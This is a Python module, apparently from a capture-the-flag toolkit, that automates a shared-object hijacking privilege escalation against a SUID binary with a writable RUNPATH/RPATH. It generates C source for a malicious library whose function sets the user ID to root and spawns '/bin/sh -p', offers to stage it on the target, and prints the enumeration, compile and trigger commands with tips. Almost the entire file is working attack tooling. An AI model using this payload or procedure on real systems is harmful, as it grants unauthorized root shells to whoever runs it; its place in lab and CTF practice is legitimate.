from pathlib import Path
import tempfile

from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

from modules.upload.linux import stage_linux_files

console = Console()


def run(data, cred, args):

    binary = args.extra[0] if len(args.extra) > 0 else "<suid_binary>"
    library_dir = args.extra[1] if len(args.extra) > 1 else "<writable_directory>"

    console.print(
        Panel.fit(
            "[bold cyan]Shared Object Hijacking[/bold cyan]\n\n"
            "[white]Requirements:[/white]\n"
            " • SUID binary\n"
            " • Writable RUNPATH/RPATH directory\n"
            " • Writable shared object location",
            border_style="cyan",
        )
    )

    #
    # Generate payload
    #
    tmpdir = Path(tempfile.mkdtemp(prefix="ctfkit_"))
    source = tmpdir / "src.c"

    source.write_text(
        """#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\\n");

    setuid(0);
    setgid(0);

    system("/bin/sh -p");
}
"""
    )

    #
    # Transfer
    #
    choice = input(
        "\nTransfer src.c to target? [Y/n]: "
    ).strip().lower()

    if choice in ("", "y", "yes"):
        stage_linux_files([source])

    #
    # Enumeration
    #
    enumeration = f"""# ==========================================
# Linked libraries
# ==========================================

ldd {binary}


# ==========================================
# Check RUNPATH / RPATH
# ==========================================

readelf -d {binary} | grep -E "RUNPATH|RPATH"


# ==========================================
# Identify missing function
# ==========================================

cp /lib/x86_64-linux-gnu/libc.so.6 {library_dir}/libshared.so

{binary}

# Example:
# ./payroll: undefined symbol: dbquery

# Replace <FUNCTION_NAME> inside src.c
# with the missing symbol.
"""

    console.print(
        Panel.fit(
            "Enumeration",
            border_style="yellow",
        )
    )

    console.print(
        Syntax(
            enumeration,
            "bash",
            theme="monokai",
        )
    )

    #
    # Compile
    #
    compile = f"""gcc \
-fPIC \
-shared \
-o {library_dir}/libshared.so \
./src.c
"""

    console.print(
        Panel.fit(
            "Compile",
            border_style="blue",
        )
    )

    console.print(
        Syntax(
            compile,
            "bash",
            theme="monokai",
        )
    )

    #
    # Exploit
    #
    exploit = f"""{binary}
"""

    console.print(
        Panel.fit(
            "Exploit",
            border_style="red",
        )
    )

    console.print(
        Syntax(
            exploit,
            "bash",
            theme="monokai",
        )
    )

    #
    # Notes
    #
    console.print(
        Panel.fit(
            "[bold yellow]Notes[/bold yellow]\n\n"
            "• The library name must match the one shown by ldd.\n"
            "• The exported function must exactly match the missing symbol.\n"
            "• RUNPATH/RPATH must point to a writable directory.\n"
            "• Trigger the binary after copying libc.so.6 to reveal the missing symbol.\n"
            "• If the library has a different name than libshared.so, update the compile command accordingly.",
            title="Tips",
            border_style="yellow",
        )
    )